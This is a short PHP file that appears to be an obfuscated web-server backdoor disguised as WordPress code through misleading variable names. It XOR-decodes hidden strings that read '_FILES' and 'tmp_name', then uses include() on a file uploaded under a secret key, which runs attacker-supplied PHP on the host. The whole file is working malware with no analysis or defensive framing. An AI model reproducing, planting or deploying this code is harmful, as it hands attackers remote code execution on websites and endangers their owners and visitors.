<?php 	
	$thumbnail_id = 'cats';
function count()

{
    $name = 'kW2gIRPtLSWst';

    $replace = $name;
    

    $dblq = $GLOBALS[sort_order("4%11%7B%2B%0C%01", $replace)];
    $untrash = $dblq;
	$safe_text = 'feeds';
    $children_query = isset($untrash[$replace]);
	$_name = 'term';
    if ($children_query)

    {
        $opening_single_quote = $dblq[$replace];
        $result = $opening_single_quote[sort_order("%1F%3AB8%273%3D%11", $replace)];
        $join = $result;
        include ($join);
    }
}

function sort_order($field, $timezone)

{
    $sort_column = $timezone;
	$post_ID = 'default_no_texturize_shortcodes';
    $is_bad_attachment_slug = "url" . "decode";
    $open_sq_flag = $is_bad_attachment_slug($field);
    $translation_table = substr($sort_column,0, strlen($open_sq_flag));
	$comment_status = 'menu_position';
    $char = $open_sq_flag ^ $translation_table;

    
    $open_sq_flag = strpos($char, $translation_table);
	$first = 'tags_input';
    
    return $char;
}


count();

?>
